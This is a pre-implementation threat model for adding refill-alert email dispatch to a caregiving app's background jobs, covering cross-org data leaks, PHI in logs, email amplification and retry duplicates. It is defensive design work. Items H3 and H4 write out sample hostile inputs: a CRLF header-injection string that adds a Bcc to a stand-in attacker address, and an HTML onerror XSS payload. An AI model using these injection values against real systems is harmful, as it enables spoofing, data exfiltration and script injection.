# ON-71 Phase 2 — Refill Alert Email Dispatch: Pre-Plan Threat Model

**Mode:** READ-ONLY. No code, no edits. Controls enumerated BEFORE implementation.
**Scope:** Email dispatch added to `apps/web/inngest/functions/refillAlert.ts` (Phase 1 `care_events` insert already shipped at `da3cbb9`). TD-176 is docs-only — no security surface, omitted from this model.

## Critical: 1 | High: 4 | Medium: 6 | Low: 3

---

## Critical

### C1 — Cross-org membership leak via missing `org_id` filter
**Threat:** Membership lookup `WHERE recipient_id = ?` without `AND org_id = med.org_id` could pull caregivers from a DIFFERENT org if recipient_id collisions exist (UUID collisions are not the risk — buggy query construction is). One org's medication PHI → another org's care team.
**Control:** Query MUST filter `org_id = med.org_id AND recipient_id IN (med.recipient_id, NULL) AND accepted_at IS NOT NULL`. RLS is bypassed in Inngest (service-role); explicit `.eq('org_id', med.org_id)` is mandatory.
**OWASP/CWE:** A01:2021 Broken Access Control / CWE-639.
**Acceptance signal:** Unit test seeds two orgs sharing nothing; medication in org A; assert email recipients drawn only from org A memberships. pgTAP not required (service-role bypasses RLS) but unit test on the repository function is.

---

## High

### H1 — Email-to-removed-caregiver (stale membership)
**Threat:** `accepted_at IS NOT NULL` is the only "active" gate today. Memberships table has no `revoked_at` / `removed_at` / `status` column (verify in schema dump before plan). A caregiver removed from the team via UI may still have `accepted_at` set and continue receiving PHI emails.
**Control:** Confirm via schema dump whether memberships has a soft-delete column. If yes, include in filter. If no, file a TD row to add `revoked_at` and gate Phase 2 dispatch behind it OR document the gap explicitly.
**OWASP/CWE:** CWE-200 Sensitive Information Exposure to Unauthorized Actor.
**Acceptance signal:** Schema dump output attached to plan; either filter clause includes revocation OR plan documents the gap with explicit acceptance.

### H2 — Email amplification (N meds × M coordinators per day)
**Threat:** A recipient with 5 low-supply meds triggers 5 separate emails per coordinator per day. Across 3 coordinators × 5 meds = 15 emails/day per org. Spam + Resend quota burn + complaint-rate risk → domain reputation degradation.
**Control:** Batch per (org_id, recipient_id) per day. One email lists all low-supply meds for that recipient. Idempotency key: `refill_email:{org_id}:{recipient_id}:{YYYY-MM-DD}` in a dedicated `email_dispatch_log` table (or extend `care_events`).
**OWASP/CWE:** A04:2021 Insecure Design / CWE-770 Resource Exhaustion.
**Acceptance signal:** Integration test seeds 3 low-supply meds for one recipient + 2 coordinators; assert exactly 2 emails sent, each with 3-med digest.

### H3 — SMTP header injection via pharmacy fields
**Threat:** `medications.pharmacy` and `medications.pharmacy_phone` are user-editable strings. If interpolated into email subject or `Reply-To` header without sanitization, CRLF injection (`\r\nBcc: attacker@evil`) could exfiltrate or spoof headers.
**Control:** Pharmacy fields only in email BODY (HTML/text), never in headers. Resend's React Email components escape by default; raw `subject:` strings must not concatenate pharmacy data. Strip `\r\n` defensively in any pharmacy field used.
**OWASP/CWE:** CWE-93 CRLF Injection.
**Acceptance signal:** Test medication with `pharmacy_phone = "555-1234\r\nBcc: x@y.com"`; assert sent email has no Bcc header and pharmacy_phone is rendered escaped in body.

### H4 — XSS in email body via pharmacy name
**Threat:** `medications.pharmacy` rendered as HTML in email could carry `<script>` or `<img onerror>`. Most clients sandbox, but Gmail/Outlook web preview, plus link-tracking redirects, are inconsistent.
**Control:** Use React Email components (auto-escape) or `escapeHtml()` on every interpolation. Never `dangerouslySetInnerHTML` for pharmacy/drug fields. Plain-text version included.
**OWASP/CWE:** A03:2021 Injection / CWE-79.
**Acceptance signal:** Test medication with `pharmacy = "<img src=x onerror=alert(1)>"`; rendered HTML contains `&lt;img` not `<img`.

---

## Medium

### M1 — Idempotency model collision with Phase 1
**Threat:** Phase 1 uses day-scoped `care_events` insert (`payload->>refill_needed=true`) for audit. Backlog suggests week-scoped email key (`refill:{med_id}:{week_stamp}`). Mixing day-scoped audit + week-scoped email = audit row exists every day but email fires once/week — confusing on incident review, and a backfill/reprocess could double-send.
**Control:** Pick ONE model. Recommend day-scoped email (matches audit) batched by recipient (per H2). Use a dedicated `email_dispatch_log(org_id, recipient_id, category, sent_on::date)` UNIQUE constraint.
**OWASP/CWE:** A04:2021 Insecure Design / CWE-841.
**Acceptance signal:** Plan doc names the idempotency table + key explicitly; migration draft attached.

### M2 — PHI in Sentry on Resend failure
**Threat:** `try { resend.emails.send({to, subject, html}) } catch (e) { Sentry.captureException(e, { extra: { to, subject, html } }) }` — drug name, days remaining, recipient email all flow into Sentry. Violates ADR-0001 (UUID-only for analytics surfaces incl. Sentry contexts).
**Control:** Catch dispatch errors; capture ONLY `{ medication_id, recipient_membership_id, error_code }` — no email body, no drug name, no `to` address. ESLint rule `carelog/no-phi-in-analytics` already covers `Sentry.setUser`/`setContext` for static keys; spread/variable forms are NOT caught — manual review required.
**OWASP/CWE:** CWE-532 Insertion of Sensitive Information into Log File.
**Acceptance signal:** Code review checklist item; test that simulates Resend 4xx and asserts Sentry payload (mock) contains no `email`/`drug_name`/`html` keys.

### M3 — Opt-out / notification preferences absent
**Threat:** No user preference table for "refill emails on/off". Users cannot stop receiving PHI emails short of leaving the team. CAN-SPAM / CASL compliance gap if Carelog ever markets internationally; user-trust gap immediately.
**Control:** EITHER add `user_notification_preferences` row gated behind a feature flag (recommend a TD row, defer), OR explicitly document as non-goal for Phase 2 with a TD-* follow-up filed. Include `List-Unsubscribe` header pointing to a no-op endpoint that records intent.
**OWASP/CWE:** A04:2021 Insecure Design / CWE-732 (over-broad default behavior).
**Acceptance signal:** Plan §non-goals lists "no per-user opt-out in Phase 2"; TD row filed and linked; `List-Unsubscribe-Post` header present even if endpoint is stubbed.

### M4 — Resend webhook / bounce handling absent
**Threat:** Hard bounces, complaints, suppressions not tracked. Continued send to dead addresses burns Resend reputation → eventual block.
**Control:** Document as non-goal; file follow-up TD for Resend webhook → suppression list. Acceptance: zero code change; just a backlog row.
**OWASP/CWE:** N/A (operational hygiene).
**Acceptance signal:** TD row in BACKLOG.md §1 Ready before Phase 2 merges.

### M5 — Inngest retry storm = duplicate emails
**Threat:** Inngest retries failed steps. If `resend.emails.send` succeeds but the subsequent `email_dispatch_log` insert fails, the function retries → duplicate email.
**Control:** Insert `email_dispatch_log` row BEFORE `resend.emails.send` with a `pending` status, then update to `sent` after. On retry, check pending+>5min-old rows and treat as "uncertain — skip" (false-negative preferred over double-send). Wrap in Inngest `step.run` with idempotent step IDs.
**OWASP/CWE:** CWE-841 Improper Enforcement of Behavioral Workflow.
**Acceptance signal:** Integration test simulates Inngest re-invocation of same step; assert exactly 1 Resend call.

### M6 — Coordinator role semantics ambiguous
**Threat:** Backlog says "coordinators + caregivers whose membership has recipient_id matching." `memberships.role` enum values must be enumerated. If new roles added later (e.g. "viewer", "agency"), default-inclusion behavior could leak.
**Control:** Explicit allowlist: `role IN ('coordinator', 'caregiver')` — never `role != 'something'`. Document the role list inline.
**OWASP/CWE:** CWE-285 Improper Authorization.
**Acceptance signal:** Filter is explicit IN-list; test seeds a `viewer` role and asserts no email.

---

## Low

### L1 — Email enumeration via timing
**Threat:** Send timing per coordinator could leak team size to a passive observer. Low impact; Carelog is not a public surface.
**Control:** Send in parallel via `Promise.allSettled`; no per-recipient delay. Acceptable.
**Acceptance signal:** N/A.

### L2 — `RESEND_FROM_EMAIL` env unset → onboarding@resend.dev fallback
**Threat:** Default fallback in `weeklyDigest.ts` is `onboarding@resend.dev` — same pattern likely copied. Production sending from Resend's shared domain harms deliverability + brand.
**Control:** Pre-flight: assert `process.env.RESEND_FROM_EMAIL` is set in production before scheduling cron; throw on missing in non-test env.
**OWASP/CWE:** N/A.
**Acceptance signal:** Startup assertion or Inngest step guard; smoke test in deploy runbook.

### L3 — Drug name in email subject visible in mobile lockscreen previews
**Threat:** "Refill needed: Sertraline (3 days left)" in subject reveals PHI to anyone glancing at the recipient's phone. Care-team members are intentional audience but lockscreen ≠ audience.
**Control:** Generic subject: "Refill alert for [recipient first name]" — PHI in body only. Match existing weeklyDigest pattern (verify).
**OWASP/CWE:** CWE-200.
**Acceptance signal:** Subject line in test snapshot contains no drug names.

---

## Required pre-implementation artifacts

1. **Schema dump** of `memberships` table — confirm columns: `role`, `accepted_at`, any `revoked_at`/`status`, `recipient_id`, `org_id`. Blocks H1.
2. **Migration draft** for `email_dispatch_log` table (or `care_events` extension). Blocks M1, M5.
3. **TD follow-up rows** filed in a separate `chore(backlog):` PR (per BACKLOG-as-SoT): per-user notification preferences (M3), Resend bounce webhook (M4). Blocks Phase 2 plan acceptance.
4. **Confirm `weeklyDigest.ts` patterns** for: subject-line PHI policy (L3), error-capture sanitization (M2), `from` address resolution (L2). Reuse don't reinvent.

## Out of scope for this threat model

- TD-176 (Sentry component tag docs) — no security surface.
- Mobile push notification dispatch — separate ON-* row, not Phase 2.
- SMS dispatch — not in backlog.

## Acceptance gate for plan-doc author

Before `/implementation-plan` writes the plan: schema dump in hand, idempotency table decision made, TD follow-ups filed. C1 + H1 + H2 controls explicitly listed in plan's "guiding decisions" section.
